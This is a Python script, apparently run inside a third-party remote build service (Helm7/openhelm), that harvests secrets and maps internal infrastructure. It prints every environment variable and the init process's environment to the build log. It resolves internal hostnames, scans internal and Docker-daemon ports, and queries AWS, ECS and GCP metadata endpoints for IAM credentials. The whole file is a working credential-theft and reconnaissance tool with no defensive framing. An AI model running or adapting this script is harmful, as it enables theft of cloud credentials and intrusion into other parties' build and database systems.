#!/usr/bin/env python3
"""Build-stage probe: runs inside Helm7 remote build (Dockerfile RUN).
Everything prints to stdout which is captured verbatim in build_log."""
import os, sys, socket, json, concurrent.futures as cf

OUT = []
def p(*a):
    s = " ".join(str(x) for x in a)
    OUT.append(s)
    print(s, flush=True)

MAX = 8192
def trunc(s, n=1200):
    s = s if isinstance(s, str) else str(s)
    return s[:n]

def http_get(url, headers=None, timeout=4):
    import urllib.request, ssl
    ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    req = urllib.request.Request(url, headers=headers or {})
    try:
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = r.read(1500).decode('utf-8','replace')
        return {"url":url,"status":r.status,"body":trunc(body)}
    except urllib.error.HTTPError as e:
        try: b = e.read(800).decode('utf-8','replace')
        except Exception: b = ""
        return {"url":url,"status":e.code,"body":trunc(b)}
    except Exception as e:
        return {"url":url,"err":f"{type(e).__name__}:{e}"}

def tcp(host, port, timeout=2.5):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close(); return True
    except Exception:
        return False

def resolve(host):
    try:
        infos = socket.getaddrinfo(host, None)
        ips = sorted({i[4][0] for i in infos})
        return ips
    except Exception as e:
        return f"ERR:{type(e).__name__}"

def readf(path, n=3000):
    try:
        return trunc(open(path,'rb').read(n).decode('utf-8','replace'))
    except Exception as e:
        return f"ERR:{type(e).__name__}"

def section(t):
    p("\n===== " + t + " =====")

section("IDENTITY")
p("hostname:", socket.gethostname())
p("uname:", " ".join(os.uname()))
p("cwd:", os.getcwd())

section("ENV")
for k in sorted(os.environ):
    p(f"env {k}={trunc(os.environ[k],400)}")

section("FILES")
p("/etc/hosts:"); p(readf("/etc/hosts"))
p("/etc/resolv.conf:"); p(readf("/etc/resolv.conf"))
p("/proc/1/environ:"); p(readf("/proc/1/environ").replace("\x00","\n"))
p("/proc/1/cmdline:"); p(readf("/proc/1/cmdline").replace("\x00"," "))
p("/proc/1/cgroup:"); p(readf("/proc/1/cgroup"))

section("DNS")
for h in ["db-internal.openhelm.ai","worker.openhelm.ai","api.openhelm.ai",
          "auth-openhelm-xhdmew.helm7.app","app.openhelm.ai","relay.openhelm.ai",
          "www.helm7.com","metadata.google.internal"]:
    p(f"dns {h} => {resolve(h)}")

section("TCP PORTS (parallel)")
jobs = []
for port in [5432,6543,2375,2376,3000,6379,8080]:
    jobs.append(("172.17.0.1", port))
jobs.append(("db-internal.openhelm.ai",5432))
for port in [22,80,443,3000,3306,5432,6379,8080,8443]:
    jobs.append(("195.201.47.165", port))
def chk(j):
    h,port = j
    return (h,port,tcp(h,port))
with cf.ThreadPoolExecutor(max_workers=16) as ex:
    for h,port,ok in ex.map(chk, jobs):
        p(f"tcp {h}:{port} = {'OPEN' if ok else 'closed/filtered'}")

section("HTTP")
for url,hdr in [
    ("http://169.254.169.254/latest/meta-data/",{}),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",{}),
    ("http://169.254.170.2/v2/credentials",{}),
    ("http://169.254.170.2/v2/metadata",{}),
    ("http://metadata.google.internal/computeMetadata/v1/",{"Metadata-Flavor":"Google"}),
    ("https://worker.openhelm.ai/health",{}),
    ("https://api.openhelm.ai/v1/models",{}),
    ("https://db-internal.openhelm.ai/rest/v1/",{}),
]:
    r = http_get(url, hdr, timeout=5)
    p("http", json.dumps(r)[:1400])

section("ARP/ROUTE")
p("/proc/net/route:"); p(readf("/proc/net/route",2000))
p("/proc/net/arp:"); p(readf("/proc/net/arp",2000))

section("END")